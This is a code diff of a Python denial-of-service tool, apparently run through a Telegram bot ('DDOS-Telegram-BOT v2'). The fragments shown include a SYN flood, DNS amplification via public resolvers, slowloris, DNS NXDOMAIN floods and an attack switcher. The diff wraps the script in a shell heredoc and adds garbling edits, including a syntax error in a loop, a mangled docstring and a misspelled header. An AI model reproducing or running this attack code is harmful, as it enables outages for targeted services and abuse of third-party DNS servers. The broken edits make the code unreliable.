@@ -1,3 +1,4 @@
+cat > ddos.py << 'EOF'
 import telebot
 import subprocess
 import socket
@@ -41,7 +42,7 @@ def syn_flood(target_ip, target_port):
 def udp_amplification(target, port=53):
     """DNS Amplification attack vector"""
     dns_servers = ['8.8.8.8', '1.1.1.1']  # Reflector list
-    payload = bytearray(random.getrandbits(8) for _ in range(1024))
+    payload = bytearray(random.getrandbits(8) for _ range(1024))
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -53,7 +54,7 @@ def udp_amplification(target, port=53):
 
 # ----- AIOHTTP-BASED ATTACKS -----
 def slowloris(target):
-    """Slow HTTP Denial of Service"""
+    """Slow HTTP Denial of DoS"""
     headers = [("User-Agent", "Mozilla/5.0"), ("Connection", "keep-alive")]
     while True:
         try:
@@ -130,7 +131,7 @@ def attack_switcher(method_id, target):
         '6': lambda: websocket_apocalypse(target)
     }.get(method_id, lambda: None)
 
-# ----- ADDITIONAL WEAPONS -----  
+# ----- ADDITIONAL WEAPNS -----  
 def dns_nxdomain_attack(target):
     """DNS query flood with non-existent domains"""
     while True:
@@ -159,3 +160,4 @@ def is_valid_ip(ip):
 if __name__ == "__main__":
     print("DDOS-Telegram-BOT v2")
     bot.infinity_polling()
+EOF
